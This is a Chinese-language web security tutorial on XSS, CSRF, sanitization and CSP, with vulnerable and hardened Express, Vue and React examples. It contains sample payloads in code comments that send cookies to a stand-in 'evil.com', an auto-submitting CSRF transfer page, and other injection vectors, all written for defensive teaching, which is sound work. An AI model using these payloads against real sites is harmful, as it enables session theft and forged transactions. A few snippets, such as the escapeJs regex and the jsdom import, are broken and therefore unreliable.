# Web 安全专项：XSS / CSRF / Sanitization / CSP

> 2026-05-01 13:00 | 阶段二附加安全专项
> 核心目标：理解攻击原理 → 写出安全代码 → 建立防御体系

---

## 一、XSS (Cross-Site Scripting) — 跨站脚本攻击

### 1.1 三种 XSS 类型

```
┌─────────────────────────────────────────────────────────┐
│                    XSS 分类                              │
├──────────┬──────────────────────────────────────────────┤
│ 反射型   │ 恶意脚本在 URL 中 → 服务器反射回页面 → 执行    │
│ 存储型   │ 恶意脚本存入数据库 → 其他用户访问时执行        │
│ DOM 型   │ 恶意脚本通过 JS DOM 操作注入 → 不经过服务器    │
└──────────┴──────────────────────────────────────────────┘
```

### 1.2 攻击演练：反射型 XSS

**漏洞代码 (后端 Node.js/Express):**

```javascript
// ❌ 危险：直接将 URL 参数拼入 HTML
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <h1>搜索结果: ${query}</h1>
    <p>您搜索了: ${query}</p>
  `);
});

// 攻击 URL:
// https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**安全修复 — 方案 A：HTML 实体编码**

```javascript
// ✅ 安全：HTML 实体编码
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
    '`': '&#96;'
  };
  return String(str).replace(/[&<>"'/`]/g, c => map[c]);
}

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q || '');
  res.send(`
    <h1>搜索结果: ${query}</h1>
    <p>您搜索了: ${query}</p>
  `);
});
```

**安全修复 — 方案 B：使用模板引擎自动转义**

```javascript
// ✅ EJS 用 <%= %> 自动转义（不要用 <%- %>）
app.get('/search', (req, res) => {
  res.render('search', {
    query: req.query.q || ''  // EJS <%= query %> 自动转义
  });
});
```

**安全修复 — 方案 C：前端框架天然防御**

```javascript
// ✅ Vue 3 — v-text / 插值 {{ }} 自动转义
// <template>
//   <p>{{ query }}</p>          <!-- 安全：自动转义 -->
//   <p v-text="query"></p>      <!-- 安全：等价 -->
//   <!-- <p v-html="query"></p>   ❌ 危险：渲染 HTML -->
// </template>

// ✅ React — JSX 自动转义
// function Search({ query }) {
//   return <h1>搜索结果: {query}</h1>;  // 安全
//   // return <div dangerouslySetInnerHTML={{ __html: query }} />  // ❌ 危险
// }
```

### 1.3 攻击演练：存储型 XSS

**漏洞场景 — 用户评论系统:**

```javascript
// ❌ 危险：评论直接存入数据库，取出后直接渲染
// 后端
app.post('/comment', express.json(), (req, res) => {
  const { postId, content } = req.body;
  // content = '<script>document.location="https://evil.com/?c="+document.cookie</script>'
  db.query('INSERT INTO comments VALUES (?, ?)', [postId, content]);
  res.json({ success: true });
});

// 前端渲染
function renderComments(comments) {
  // ❌ innerHTML 直接插入用户输入
  commentList.innerHTML = comments
    .map(c => `<div class="comment">${c.content}</div>`)
    .join('');
}
```

**安全修复 — 多层防御:**

```javascript
// 第 1 层：后端入库前清洗
const { JSDOM, sanitize } = require('jsdom');

function sanitizeComment(text) {
  // 方案 1：纯文本转义（最安全）
  return escapeHtml(text);

  // 方案 2：允许有限 HTML（富文本场景）
  // 使用 DOMPurify 或 sanitize-html
}

// 第 2 层：前端渲染时二次转义
function renderComments(comments) {
  // 框架自动转义（Vue/React）
  // 或手动转义
  commentList.innerHTML = comments
    .map(c => `<div class="comment">${escapeHtml(c.content)}</div>`)
    .join('');
}

// 第 3 层：CSP 兜底（即使脚本注入也无法执行）
// Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 1.4 攻击演练：DOM 型 XSS

**漏洞场景:**

```javascript
// ❌ 危险：从 URL 读取参数直接写入 DOM
// URL: https://example.com/page#<img src=x onerror=alert(1)>
const hash = window.location.hash.slice(1);
document.getElementById('content').innerHTML = hash;

// ❌ 危险：动态创建 script 标签
const lang = new URLSearchParams(location.search).get('lang');
const script = document.createElement('script');
script.src = `/i18n/${lang}.js`;  // lang = '../evil.js?'
document.head.appendChild(script);

// ❌ 危险：eval / setTimeout / setInterval 执行用户输入
const code = new URLSearchParams(location.search).get('code');
eval(code);  // code = 'alert(document.cookie)'

setTimeout(code, 0);  // 同样危险
```

**安全修复:**

```javascript
// ✅ DOM 型 XSS 防御
// 1. 永远不要将用户输入写入 innerHTML / outerHTML
document.getElementById('content').textContent = hash;  // 纯文本

// 2. URL 参数做白名单校验
const lang = new URLSearchParams(location.search).get('lang');
const allowedLangs = ['zh-CN', 'en-US', 'ja-JP'];
if (allowedLangs.includes(lang)) {
  script.src = `/i18n/${encodeURIComponent(lang)}.js`;
}

// 3. 绝对禁止 eval / Function / setTimeout(string)
// 用安全替代方案：
// ❌ eval('userInput')
// ✅ JSON.parse / 策略模式 / 函数映射
const actions = {
  'sort': sortData,
  'filter': filterData,
  'export': exportData
};
const action = userInput;
if (actions[action]) actions[action]();

// 4. 避免直接操作 location.href / window.location
// ❌ location.href = userInput
// ✅ 白名单校验
const allowedUrls = ['/home', '/profile', '/settings'];
if (allowedUrls.includes(userInput)) {
  location.href = userInput;
}
```

### 1.5 高级 XSS 攻击向量

```javascript
// 1. 事件处理器注入
// ❌ <div onclick="handleClick('${userInput}')">
// userInput = '); alert(1);//
// 修复: 不要在 HTML 属性中拼接用户输入

// 2. JavaScript URL
// ❌ <a href="${userInput}">链接</a>
// userInput = javascript:alert(document.cookie)
// 修复: 校验 URL 协议
function isSafeUrl(url) {
  try {
    const u = new URL(url, location.origin);
    return u.protocol === 'http:' || u.protocol === 'https:';
  } catch {
    return false;
  }
}

// 3. SVG 中的脚本
// ❌ <svg><script>alert(1)</script></svg>
// 修复: 使用 sanitize-html 过滤 SVG 中的 script 标签

// 4. CSS 注入
// ❌ <div style="background: url(${userInput})">
// userInput = javascript:alert(1) 或 data:image/svg+xml,...
// 修复: 白名单校验 CSS 属性值

// 5. Base URI 劫持
// ❌ 页面没有 <base> 标签，攻击者注入 <base href="https://evil.com/">
// 修复: 显式设置 <base href="/">
```

---

## 二、CSRF (Cross-Site Request Forgery) — 跨站请求伪造

### 2.1 攻击原理

```
┌──────────────────────────────────────────────────────────┐
│                    CSRF 攻击流程                          │
│                                                          │
│  1. 用户登录 bank.com（获得 cookie）                      │
│  2. 用户访问 evil.com（恶意页面）                         │
│  3. evil.com 包含:                                       │
│     <form action="https://bank.com/transfer" method="POST">│
│       <input name="to" value="attacker">                  │
│       <input name="amount" value="10000">                 │
│     </form>                                               │
│     <script>document.forms[0].submit()</script>           │
│  4. 浏览器自动携带 bank.com 的 cookie 发送请求             │
│  5. bank.com 验证 cookie 通过 → 转账成功 💸               │
└──────────────────────────────────────────────────────────┘
```

### 2.2 攻击演练

```html
<!-- evil.com 恶意页面 -->
<!DOCTYPE html>
<html>
<body>
  <h1>恭喜中奖！点击领取</h1>

  <!-- 方案 1: 自动提交的表单 -->
  <form action="https://bank.com/api/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="99999">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>

  <!-- 方案 2: 图片标签 GET 请求 -->
  <!-- <img src="https://bank.com/api/transfer?to=attacker&amount=99999" /> -->

  <!-- 方案 3: Fetch 请求 -->
  <!--
  <script>
    fetch('https://bank.com/api/transfer', {
      method: 'POST',
      credentials: 'include',  // 携带 cookie
      body: 'to=attacker&amount=99999'
    });
  </script>
  -->
</body>
</html>
```

### 2.3 防御方案

**方案 1: SameSite Cookie（最简单有效）**

```javascript
// 后端设置 Cookie
res.cookie('session', sessionId, {
  httpOnly: true,      // 防 XSS 读取
  secure: true,        // 仅 HTTPS
  sameSite: 'strict',  // ✅ 跨站不发送 cookie
  // sameSite: 'lax',  // 宽松模式：GET 导航允许，POST 不允许
  maxAge: 3600000
});

// SameSite 三种模式:
// strict:  任何跨站请求都不带 cookie（最安全，可能影响 OAuth 跳转）
// lax:     顶级导航 GET 带 cookie，POST/iframe/ajax 不带（推荐默认值）
// none:    跨站也带 cookie（需要 secure=true，不推荐）
```

**方案 2: CSRF Token（双提交模式）**

```javascript
// 后端生成 Token
const crypto = require('crypto');
const tokens = new Map();

app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// 验证 Token
function verifyCsrfToken(req, res, next) {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

app.post('/api/transfer', verifyCsrfToken, express.json(), (req, res) => {
  // 处理转账
  res.json({ success: true });
});

// 前端提交 Token
// HTML 表单:
// <form>
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   ...
// </form>

// AJAX/Fetch:
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: {
//     'Content-Type': 'application/json',
//     'X-CSRF-Token': csrfToken  // 自定义 Header 浏览器不会自动携带
//   },
//   body: JSON.stringify({ to: 'user', amount: 100 })
// });
```

**方案 3: Referer / Origin 校验**

```javascript
function verifyOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin) {
    return res.status(403).json({ error: 'Missing origin' });
  }
  const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];
  const originHost = new URL(origin).origin;
  if (!allowedOrigins.includes(originHost)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
}

app.post('/api/transfer', verifyOrigin, (req, res) => {
  // ...
});
```

**方案 4: 双重 Cookie Token**

```javascript
// 原理：CSRF 攻击者无法读取 cookie，但可以设置
// 服务端在 cookie 中写入 token，前端读取后放在请求体/Header 中
// 服务端比对 cookie 和请求体中的 token 是否一致

// 后端设置 cookie
app.use((req, res, next) => {
  if (!req.cookies.xsrf_token) {
    const token = crypto.randomBytes(16).toString('hex');
    res.cookie('XSRF-TOKEN', token, {
      httpOnly: false,  // 前端需要读取
      secure: true,
      sameSite: 'lax'
    });
  }
  next();
});

// 后端验证
function verifyDoubleCookie(req, res, next) {
  const cookieToken = req.cookies['XSRF-TOKEN'];
  const bodyToken = req.headers['x-xsrf-token'];
  if (!cookieToken || cookieToken !== bodyToken) {
    return res.status(403).json({ error: 'Token mismatch' });
  }
  next();
}

// 前端 Axios 自动处理
// axios.defaults.withCredentials = true;
// axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
// axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
```

### 2.4 CSRF 防御对比

| 方案 | 安全性 | 兼容性 | 复杂度 | 推荐度 |
|------|--------|--------|--------|--------|
| SameSite Cookie | ⭐⭐⭐⭐ | 现代浏览器支持 | 极低 | ✅ 首选 |
| CSRF Token | ⭐⭐⭐⭐⭐ | 全浏览器 | 中 | ✅ 推荐 |
| Referer 校验 | ⭐⭐⭐ | 全浏览器 | 低 | ⚠️ 辅助 |
| 双重 Cookie | ⭐⭐⭐⭐ | 全浏览器 | 中 | ✅ 推荐 |
| CAPTCHA | ⭐⭐⭐⭐⭐ | 全浏览器 | 高 | ⚠️ 敏感操作 |

---

## 三、Sanitization — 输入清洗与输出编码

### 3.1 输入 vs 输出

```
┌─────────────────────────────────────────────────────────┐
│              安全原则：验证输入 + 编码输出                 │
│                                                          │
│  输入验证 (Validation)                                    │
│  - 类型检查: string/number/boolean                        │
│  - 长度限制: max length                                   │
│  - 格式校验: regex / schema                               │
│  - 白名单: 只允许已知安全的值                              │
│                                                          │
│  输出编码 (Encoding)                                      │
│  - HTML 上下文: &lt; &gt; &amp; &quot;                    │
│  - JS 上下文: \xNN 转义                                   │
│  - URL 上下文: encodeURIComponent                        │
│  - CSS 上下文: 白名单属性值                                │
│  - SQL 上下文: 参数化查询                                  │
└─────────────────────────────────────────────────────────┘
```

### 3.2 上下文感知编码

```javascript
// 核心原则：编码方式取决于输出上下文

// ── HTML 正文上下文 ──
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// ── HTML 属性上下文 ──
function escapeHtmlAttr(str) {
  // 属性值用双引号包裹时
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/`/g, '&#96;');  // 防 IE 的 ` 闭合
}

// ── JavaScript 字符串上下文 ──
function escapeJs(str) {
  return String(str)
    .replace(/\\/g, '\\\\')
    .replace(/'/g, '\\\'')
    .replace(/"/g, '\\"')
    .replace(/`/g, '\\`')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/<\/g, '<\\/')  // 防 </script> 闭合
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

// ── URL 上下文 ──
function escapeUrl(str) {
  return encodeURIComponent(str);
  // 注意: encodeURIComponent 不编码 ! ' ( ) *
  // 如需更严格: encodeURIComponent(str).replace(/[!'()*]/g, c => '%' + c.charCodeAt(0).toString(16))
}

// ── CSS 上下文 ──
function escapeCss(str) {
  // CSS 中只允许字母数字和有限特殊字符
  return String(str).replace(/[^a-zA-Z0-9-_]/g, '');
}

// ── SQL 上下文 ──
// ✅ 永远使用参数化查询，不要拼接 SQL
// ❌ 错误: `SELECT * FROM users WHERE name = '${name}'`
// ✅ 正确:
// db.query('SELECT * FROM users WHERE name = ?', [name]);
```

### 3.3 富文本清洗（允许有限 HTML）

```javascript
// 使用 sanitize-html (Node.js)
const sanitizeHtml = require('sanitize-html');

// 基础配置
const clean = sanitizeHtml(dirtyHtml, {
  allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img', 'h1', 'h2']),
  allowedAttributes: {
    'a': ['href', 'name', 'target'],
    'img': ['src', 'alt', 'width', 'height'],
    '*': ['class']
  },
  allowedSchemes: ['http', 'https', 'mailto'],
  // 禁止 javascript: URL
  allowedProtocols: ['http', 'https'],
  // 自动添加 rel
  transformTags: {
    'a': (tagName, attribs) => {
      attribs.rel = 'noopener noreferrer';
      attribs.target = '_blank';
      return { tagName, attribs };
    }
  },
  // 过滤 style 中的危险属性
  allowedStyles: {
    '*': {
      'color': [/^#(0|[1-9a-fA-F][0-9a-fA-F]{0,5})$/],
      'text-align': [/^left$/, /^right$/, /^center$/],
      'font-size': [/^\d+(?:px|em|%)$/]
    }
  }
});

// DOMPurify (浏览器端)
// <script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
// const clean = DOMPurify.sanitize(dirtyHtml, {
//   ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
//   ALLOWED_ATTR: ['href', 'target'],
//   FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
//   FORBID_ATTR: ['onerror', 'onload', 'onclick']
// });
```

### 3.4 输入验证实战

```javascript
// 使用 Zod 做运行时类型校验
const { z } = require('zod');

// 用户注册验证
const UserSchema = z.object({
  username: z.string()
    .min(3, '用户名至少 3 个字符')
    .max(20, '用户名最多 20 个字符')
    .regex(/^[a-zA-Z0-9_]+$/, '只能包含字母、数字和下划线'),
  email: z.string()
    .email('邮箱格式不正确')
    .max(100),
  age: z.number()
    .int('年龄必须是整数')
    .min(0, '年龄不能为负')
    .max(150, '年龄不合理'),
  bio: z.string()
    .max(500, '简介最多 500 个字符')
    .optional(),
  website: z.string()
    .url('必须是有效 URL')
    .refine(url => {
      const u = new URL(url);
      return u.protocol === 'https:';
    }, '必须使用 HTTPS')
    .optional()
});

// Express 中间件
function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.error.errors
      });
    }
    req.validatedBody = result.data;
    next();
  };
}

app.post('/api/register', validate(UserSchema), (req, res) => {
  const { username, email, age, bio, website } = req.validatedBody;
  // 此时数据已验证，可以安全使用
  // ...
});
```

---

## 四、Content Security Policy (CSP) — 内容安全策略

### 4.1 CSP 原理

```
┌─────────────────────────────────────────────────────────┐
│                    CSP 工作原理                          │
│                                                          │
│  浏览器收到响应 → 读取 CSP Header                        │
│  → 检查页面加载的所有资源是否符合策略                     │
│  → 违规资源被阻止加载                                     │
│  → (可选) 向指定 URL 发送违规报告                        │
└─────────────────────────────────────────────────────────┘
```

### 4.2 CSP 指令速查

```
# 基础指令
Content-Security-Policy: \
  default-src 'self';                    \
  script-src 'self' https://cdn.example.com; \
  style-src 'self' 'unsafe-inline';      \
  img-src 'self' data: https:;           \
  font-src 'self' https://fonts.gstatic.com; \
  connect-src 'self' https://api.example.com; \
  media-src 'self';                      \
  object-src 'none';                     \
  frame-src 'none';                      \
  base-uri 'self';                       \
  form-action 'self';                    \
  upgrade-insecure-requests;             \
  block-all-mixed-content;               \
  report-uri /csp-report;                \
  report-to csp-endpoint

# 指令含义:
# default-src  → 默认规则（适用于未单独指定的类型）
# script-src   → JavaScript 来源
# style-src    → CSS 来源
# img-src      → 图片来源
# font-src     → 字体来源
# connect-src  → XHR/Fetch/WebSocket 来源
# media-src    → 音视频来源
# object-src   → <object>/<embed>/<applet>
# frame-src    → <iframe> 来源
# base-uri     → <base> 标签来源
# form-action  → <form> action 来源
# upgrade-insecure-requests → HTTP 自动升 HTTPS
# block-all-mixed-content   → 阻止混合内容
```

### 4.3 关键字

```
'self'        → 同源（协议+域名+端口）
'none'        → 什么都不允许
'unsafe-inline'   → 允许内联 JS/CSS（不推荐）
'unsafe-eval'     → 允许 eval() 等（不推荐）
'unsafe-hashes'   → 允许特定 hash 的内联脚本
'nonce-<base64>'  → 允许特定 nonce 的内联脚本
'strict-dynamic'  → 信任由可信脚本加载的脚本
<hash-algo>-<base64> → 允许特定 hash 的内容
```

### 4.4 实战配置

**配置 1: 严格 CSP（推荐目标）**

```javascript
// Express 中间件
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    connectSrc: ["'self'", 'https://api.example.com'],
    mediaSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    // 违规报告
    reportUri: ['/csp-report'],
    reportTo: ['csp-endpoint']
  }
}));

// 违规报告端点
app.post('/csp-report', express.json(), (req, res) => {
  console.log('CSP Violation:', JSON.stringify(req.body, null, 2));
  // 可以存入数据库/发送到监控服务
  res.status(204).end();
});
```

**配置 2: 使用 Nonce 允许必要内联脚本**

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  // 每次请求生成唯一 nonce
  req.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  const nonce = req.cspNonce;
  res.setHeader('Content-Security-Policy',
    `default-src 'self'; ` +
    `script-src 'self' 'nonce-${nonce}'; ` +
    `style-src 'self' 'nonce-${nonce}'; ` +
    `object-src 'none'; ` +
    `base-uri 'self'; ` +
    `form-action 'self'`
  );
  res.locals.cspNonce = nonce;
  next();
});

// 模板中使用 nonce
// <script nonce="<%= cspNonce %>">
//   // 内联 JS 可以执行
//   window.__INITIAL_STATE__ = <%- JSON.stringify(state) %>;
// </script>
//
// <style nonce="<%= cspNonce %>">
//   /* 内联 CSS 可以执行 */
// </style>
```

**配置 3: 渐进式 CSP（先用 report-only 测试）**

```javascript
// 先用 Content-Security-Policy-Report-Only 观察违规
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],  // 先宽松
  },
  // 报告模式：不阻止，只报告
  reportOnly: true,
  reportUri: '/csp-report'
}));

// 观察一段时间 → 分析报告 → 收紧策略 → 切换到 enforce 模式
```

### 4.5 CSP 与 Vue/React 的配合

```javascript
// Vue 3 + CSP 兼容方案

// 1. 禁用 eval（Vue 模板编译需要 eval，生产环境用预编译）
// vue.config.js
module.exports = {
  runtimeCompiler: false  // ✅ 生产环境不用运行时编译
};

// 2. 内联样式用 nonce
// <style nonce="{{ nonce }}">.my-component { ... }</style>

// 3. 内联数据用 nonce + JSON
// <script nonce="{{ nonce }}">
//   window.__APP_DATA__ = {{ json(data) | safe }};
// </script>

// React + CSP 兼容方案
// 1. React 本身兼容 CSP（不用 eval）
// 2. React 事件系统是安全的（不生成内联 onclick）
// 3. dangerouslySetInnerHTML 需要额外注意（用 DOMPurify 清洗）
```

---

## 五、综合攻防演练

### 5.1 场景：用户个人资料页

```javascript
// ═══════════════════════════════════════════
// ❌ 漏洞百出的版本
// ═══════════════════════════════════════════

// 1. 存储型 XSS：用户输入直接入库
app.post('/api/profile', express.json(), (req, res) => {
  const { name, bio, website } = req.body;
  // ❌ 无验证
  db.query('UPDATE users SET name=?, bio=?, website=? WHERE id=?',
    [name, bio, website, req.session.userId]);
  res.json({ success: true });
});

// 2. 渲染时直接 innerHTML
// ❌ <div v-html="user.bio"></div>
// ❌ <div dangerouslySetInnerHTML={{ __html: user.bio }} />
// ❌ <a href="{{ user.website }}">{{ user.website }}</a>

// 3. 无 CSRF 保护
// ❌ 任何网站都可以伪造请求修改用户资料

// 4. 无 CSP
// ❌ 没有 Content-Security-Policy Header


// ═══════════════════════════════════════════
// ✅ 安全加固版本
// ═══════════════════════════════════════════

// 1. 输入验证
const ProfileSchema = z.object({
  name: z.string().min(1).max(50).regex(/^[^<>]*$/, '不能包含 HTML 标签'),
  bio: z.string().max(500).optional(),
  website: z.string().url().optional()
    .refine(url => !url || new URL(url).protocol === 'https:', '必须 HTTPS')
});

// 2. CSRF 保护
app.post('/api/profile',
  // SameSite Cookie 已在 session 中间件配置
  // CSRF Token 验证
  (req, res, next) => {
    const token = req.headers['x-csrf-token'];
    if (!token || token !== req.session.csrfToken) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    next();
  },
  // 输入验证
  (req, res, next) => {
    const result = ProfileSchema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({ error: result.error.errors });
    }
    req.validatedBody = result.data;
    next();
  },
  // 清洗输出
  (req, res, next) => {
    const { name, bio, website } = req.validatedBody;
    req.cleanedData = {
      name: escapeHtml(name),
      bio: bio ? sanitizeHtml(bio, {
        allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
        allowedAttributes: {}
      }) : '',
      website: website ? escapeHtml(website) : ''
    };
    next();
  },
  // 存入数据库
  (req, res) => {
    const { name, bio, website } = req.cleanedData;
    db.query('UPDATE users SET name=?, bio=?, website=? WHERE id=?',
      [name, bio, website, req.session.userId]);
    res.json({ success: true });
  }
);

// 3. CSP Header（helmet 中间件）
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Vue/React 需要
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"]
  }
}));

// 4. 其他安全 Header
app.use(helmet());  // 包含 X-Content-Type-Options, X-Frame-Options 等
app.use(helmet.xssFilter());
app.use(helmet.noSniff());
app.use(helmet.frameguard({ action: 'deny' }));
```

### 5.2 场景：搜索功能

```javascript
// ═══════════════════════════════════════════
// ❌ 漏洞版本
// ═══════════════════════════════════════════

// 反射型 XSS + SQL 注入
app.get('/search', (req, res) => {
  const q = req.query.q;
  // ❌ XSS: 直接拼入 HTML
  // ❌ SQL 注入: 直接拼入 SQL
  db.query(`SELECT * FROM products WHERE name LIKE '%${q}%'`, (err, results) => {
    res.send(`<h1>搜索结果: ${q}</h1><div>${results}</div>`);
  });
});


// ═══════════════════════════════════════════
// ✅ 安全版本
// ═══════════════════════════════════════════

const SearchSchema = z.object({
  q: z.string().min(1).max(100)
    .regex(/^[a-zA-Z0-9\u4e00-\u9fa5\s\-_]+$/, '只能包含字母、数字、中文和空格')
});

app.get('/search', (req, res, next) => {
  const result = SearchSchema.safeParse({ q: req.query.q || '' });
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid search query' });
  }

  const query = result.data.q;

  // ✅ 参数化查询防 SQL 注入
  db.query(
    'SELECT id, name, price FROM products WHERE name LIKE ?',
    [`%${query}%`],
    (err, results) => {
      if (err) return res.status(500).json({ error: 'Search failed' });

      // ✅ 输出编码防 XSS
      const safeResults = results.map(r => ({
        ...r,
        name: escapeHtml(r.name)
      }));

      res.render('search', {
        query: escapeHtml(query),
        results: safeResults
      });
    }
  );
});
```

### 5.3 场景：文件上传

```javascript
// ═══════════════════════════════════════════
// ✅ 安全文件上传
// ═══════════════════════════════════════════

const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// 文件类型白名单
const ALLOWED_TYPES = {
  'image/jpeg': '.jpg',
  'image/png': '.png',
  'image/gif': '.gif',
  'image/webp': '.webp'
};

const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'uploads'));
  },
  filename: (req, file, cb) => {
    // ✅ 用随机文件名，不用用户原始文件名
    const ext = ALLOWED_TYPES[file.mimetype];
    cb(null, `${crypto.randomBytes(16).toString('hex')}${ext}`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (req, file, cb) => {
    // ✅ 白名单校验 MIME 类型
    if (ALLOWED_TYPES[file.mimetype]) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'), false);
    }
  }
});

// 访问上传文件时设置 Content-Type 和 CSP
app.get('/uploads/:filename', (req, res) => {
  const filename = req.params.filename;
  // ✅ 校验文件名格式（只允许 hex + 扩展名）
  if (!/^[a-f0-9]+\.(jpg|png|gif|webp)$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  const filePath = path.join(__dirname, 'uploads', filename);
  // ✅ 设置安全 Header
  res.setHeader('Content-Type', 'image/png');  // 固定类型，不依赖文件内容
  res.setHeader('Content-Disposition', 'inline');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // ✅ 禁止执行脚本
  res.setHeader('Content-Security-Policy', "default-src 'none'; img-src 'self'");

  res.sendFile(filePath);
});

app.post('/api/upload', upload.single('avatar'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  res.json({
    success: true,
    filename: req.file.filename,
    url: `/uploads/${req.file.filename}`
  });
});
```

---

## 六、安全 Header 速查表

```
# 完整安全 Header 配置
app.use(helmet());

# 等价于设置以下 Header:
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff          # 禁止 MIME 类型嗅探
X-Frame-Options: DENY                    # 禁止 iframe 嵌入
X-XSS-Protection: 0                      # 禁用浏览器 XSS filter（CSP 替代）
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=31536000; includeSubDomains  # HSTS

# 额外推荐:
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

---

## 七、安全 Checklist

```
□ 输入验证
  □ 所有用户输入都做类型/长度/格式校验
  □ 使用白名单而非黑名单
  □ 文件上传校验 MIME 类型 + 扩展名 + 大小

□ 输出编码
  □ HTML 上下文: HTML 实体编码
  □ JS 上下文: JS 字符串转义
  □ URL 上下文: encodeURIComponent
  □ SQL 上下文: 参数化查询

□ XSS 防护
  □ 框架自动转义（Vue {{ }} / React JSX）
  □ 禁止 v-html / dangerouslySetInnerHTML（或配合 DOMPurify）
  □ 禁止 eval / innerHTML / document.write
  □ CSP 阻止内联脚本执行

□ CSRF 防护
  □ SameSite Cookie (strict/lax)
  □ CSRF Token 验证
  □ 敏感操作二次确认

□ CSP
  □ 配置 Content-Security-Policy
  □ object-src 'none'
  □ base-uri 'self'
  □ form-action 'self'
  □ 先用 report-only 测试

□ 安全 Header
  □ X-Content-Type-Options: nosniff
  □ X-Frame-Options: DENY
  □ Strict-Transport-Security (HSTS)
  □ Referrer-Policy

□ 认证 & 会话
  □ HttpOnly + Secure Cookie
  □ 会话超时
  □ 密码 bcrypt/argon2 哈希
  □ 速率限制（防暴力破解）

□ 其他
  □ 依赖漏洞扫描 (npm audit)
  □ 日志记录（不记录敏感信息）
  □ 错误信息不泄露内部细节
```

---

## 八、常见陷阱

```
❌ 陷阱 1: 只在客户端做验证
  → 攻击者可以绕过前端，直接发 HTTP 请求
  → 修复: 前后端都做验证

❌ 陷阱 2: 用黑名单过滤 XSS
  → 黑名单永远无法覆盖所有攻击向量
  → 修复: 用白名单 + 成熟的清洗库 (DOMPurify/sanitize-html)

❌ 陷阱 3: 认为 POST 请求不需要 CSRF 保护
  → CSRF 攻击可以发起 POST 请求
  → 修复: 所有状态变更请求都需要 CSRF 保护

❌ 陷阱 4: CSP 中用 'unsafe-inline' 解决所有问题
  → 这等于 CSP 形同虚设
  → 修复: 用 nonce 或 hash 替代

❌ 陷阱 5: 用正则验证 URL
  → 正则无法正确处理所有 URL 边界情况
  → 修复: 用 new URL() 解析 + 协议白名单

❌ 陷阱 6: 错误信息暴露内部细节
  → 生产环境返回 stack trace / SQL 错误
  → 修复: 统一错误处理，返回通用错误信息

❌ 陷阱 7: 忘记清理旧会话
  → 过期会话仍可被使用
  → 修复: 设置会话超时 + 定期清理
```

---

## 产出总结

| 模块 | 内容 | 代码示例数 |
|------|------|-----------|
| XSS | 反射型/存储型/DOM 型 + 高级攻击向量 | 15+ |
